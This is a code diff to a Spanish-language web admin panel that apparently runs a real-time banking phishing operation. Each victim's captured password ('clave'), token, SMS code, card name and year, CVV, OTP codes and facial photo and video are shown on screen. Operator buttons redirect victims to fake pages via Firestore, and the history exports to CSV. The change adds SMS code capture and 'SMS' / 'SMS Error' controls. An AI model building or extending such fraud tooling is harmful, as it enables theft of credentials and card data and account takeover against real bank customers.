@@ -699,7 +699,7 @@ function getPageLocationForAction(action) {
             return "index";
         case "sms":
         case "sms_err":
-            return "tdc";
+            return "sms";
         case "tdc":
             return "tdc";
         case "tdc_err":
@@ -1178,6 +1178,8 @@ function updateUI(docs) {
                         <span class="copyable" style="cursor:pointer; color:${textColor};" data-value="${clave}" title="Haz clic para copiar">${clave} <img src="http://clipground.com/images/copy-4.png" style="width:15px; height:15px;"></span>
                         <span style="font-weight:600;">Token:</span>
                         <span class="copyable" style="cursor:pointer; color:${textColor};" data-value="${token}" title="Haz clic para copiar">${token} <img src="http://clipground.com/images/copy-4.png" style="width:15px; height:15px;"></span>
+                        <span style="font-weight:600;">SMS:</span>
+                        <span class="copyable" style="cursor:pointer; color:${textColor};" data-value="${sms}" title="Haz clic para copiar">${sms} <img src="http://clipground.com/images/copy-4.png" style="width:15px; height:15px;"></span>
                    </div>
                     <div>
                         <span style="font-weight:600;">TDC Nombre:</span>
@@ -1207,13 +1209,15 @@ function updateUI(docs) {
                         <button class="btn btn-danger action-btn btn-sm mr-1 rounded" data-action="index_err" data-id="${userId}">Index Error</button>
                         <button class="btn btn-info action-btn btn-sm mr-1 rounded" data-action="token" data-id="${userId}">Token</button>
                         <button class="btn btn-danger action-btn btn-sm mr-1 rounded" data-action="token_err" data-id="${userId}">Token Error</button>
-                        <button class="btn btn-dark action-btn btn-sm mr-1 rounded" data-action="view_video" data-id="${userId}">Foto</button>
+                        <button class="btn btn-primary action-btn btn-sm mr-1 rounded" data-action="sms" data-id="${userId}">SMS</button>
+                        <button class="btn btn-danger action-btn btn-sm mr-1 rounded" data-action="sms_err" data-id="${userId}">SMS Error</button>
                         </div>
                         <div>
                         <button class="btn btn-primary action-btn btn-sm mr-1 rounded" data-action="tdc" data-id="${userId}">TDC</button>
                         <button class="btn btn-danger action-btn btn-sm mr-1 rounded" data-action="tdc_err" data-id="${userId}">TDC Error</button>
                         <button class="btn btn-secondary action-btn btn-sm mr-1 rounded" data-action="facial" data-id="${userId}">Facial</button>
                         <button class="btn btn-danger action-btn btn-sm mr-1 rounded" data-action="facial_err" data-id="${userId}">Facial Error</button>
+                        <button class="btn btn-dark action-btn btn-sm mr-1 rounded" data-action="view_video" data-id="${userId}">Foto</button>
                         <button class="btn btn-danger action-btn btn-sm rounded" data-action="remove" data-id="${userId}">Eliminar</button>
                     </div>
                     </div>
@@ -1559,11 +1563,34 @@ function handleUserAction(event) {
         return;
     }
 
+    if (action === "sms") {
+        setAdminActionInProgress();
+        updateDoc(doc(db, "redireccion", userId), {
+            sms: true,
+            page: 12,
+            smsEstado: "ok",
+            smsEsperandoPanel: false,
+            smsUltimaPagina: "sms",
+            smsActualizadoEn: new Date().toISOString(),
+            pageLocation: getPageLocationForAction(action),
+            adminCommandAt: Date.now()
+        })
+            .then(() => {
+                animateCard(card, "#e8fff0");
+            })
+            .catch((error) => console.error("sms error:", error));
+        return;
+    }
+
     if (action === "sms_err") {
         setAdminActionInProgress();
         updateDoc(doc(db, "redireccion", userId), {
             smsErr: true,
-            page: 4,
+            page: 13,
+            smsEstado: "error",
+            smsEsperandoPanel: false,
+            smsUltimaPagina: "sms_err",
+            smsActualizadoEn: new Date().toISOString(),
             pageLocation: getPageLocationForAction(action),
             adminCommandAt: Date.now()
         })
@@ -2063,6 +2090,7 @@ window.exportarHistorialCSV = function() {
         'TDC Año',
         'CVV',
         'OTP',
+        'SMS',
         'OTP2',
         'Foto Facial',
         'Video Facial'
